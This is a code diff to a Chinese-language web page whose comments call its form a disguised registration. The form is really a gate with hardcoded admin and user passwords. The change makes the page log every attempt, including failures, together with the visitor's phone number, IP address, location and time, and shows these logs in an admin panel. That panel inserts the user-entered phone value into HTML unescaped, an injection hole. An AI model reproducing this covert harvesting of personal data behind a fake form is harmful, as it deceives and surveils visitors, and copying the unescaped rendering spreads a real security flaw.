@@ -28,6 +28,7 @@
   .tab-active{background:#409eff}
   .tab-inactive{background:#909399}
   .tip{text-align:center;font-size:12px;color:#909399;margin-top:14px}
+  .fail-tag{color:#f56c6c;font-weight:500}
 </style>
 </head>
 <body>
@@ -183,30 +184,7 @@ async function saveFullData(data){
   }
 }
 
-// 伪装注册逻辑
-async function handleRegister() {
-  const inputPhone = document.getElementById("phone").value.trim();
-  const inputPwd = document.getElementById("pwd").value;
-  
-  // 管理员密码
-  if (inputPwd === ADMIN_PWD) {
-    await recordLogin(inputPhone, '管理员');
-    sessionStorage.setItem("admin_status", "1");
-    showAdmin();
-  } 
-  // 普通用户密码
-  else if (inputPwd === NORMAL_PWD) {
-    await recordLogin(inputPhone, '普通用户');
-    sessionStorage.setItem("login_status", "1");
-    showMain();
-  } 
-  // 错误提示
-  else {
-    alert("注册失败，请检查密码格式是否正确");
-  }
-}
-
-// 记录登录信息
+// 记录登录/失败信息
 async function recordLogin(phone, role){
   try {
     const ip = await getIP();
@@ -224,6 +202,30 @@ async function recordLogin(phone, role){
     await saveFullData(data);
   } catch (err) {
     console.error("记录登录失败：", err);
+  }
+}
+
+// 伪装注册逻辑（记录所有尝试）
+async function handleRegister() {
+  const inputPhone = document.getElementById("phone").value.trim();
+  const inputPwd = document.getElementById("pwd").value;
+  
+  // 管理员密码
+  if (inputPwd === ADMIN_PWD) {
+    await recordLogin(inputPhone, '管理员');
+    sessionStorage.setItem("admin_status", "1");
+    showAdmin();
+  } 
+  // 普通用户密码
+  else if (inputPwd === NORMAL_PWD) {
+    await recordLogin(inputPhone, '普通用户');
+    sessionStorage.setItem("login_status", "1");
+    showMain();
+  } 
+  // 密码错误（记录失败）
+  else {
+    await recordLogin(inputPhone, '登录失败');
+    alert("注册失败，请检查密码格式是否正确");
   }
 }
 
@@ -254,7 +256,7 @@ async function loadMessages() {
   }
 }
 
-// 加载后台登录记录
+// 加载后台登录记录（失败记录红色标记）
 async function loadAdminLogs() {
   const listDom = document.getElementById("adminList");
   try {
@@ -263,11 +265,12 @@ async function loadAdminLogs() {
     
     let html = "";
     logList.forEach(item => {
+      const isFail = item.role === '登录失败';
       html += `
       <div class="log-item">
         <div class="log-meta">
           <div>手机号：${item.phone}</div>
-          <div>身份：${item.role}</div>
+          <div>身份：${isFail ? '<span class="fail-tag">登录失败</span>' : item.role}</div>
           <div>IP：${item.ip}</div>
           <div>地址：${item.loc}</div>
           <div>时间：${item.time}</div>
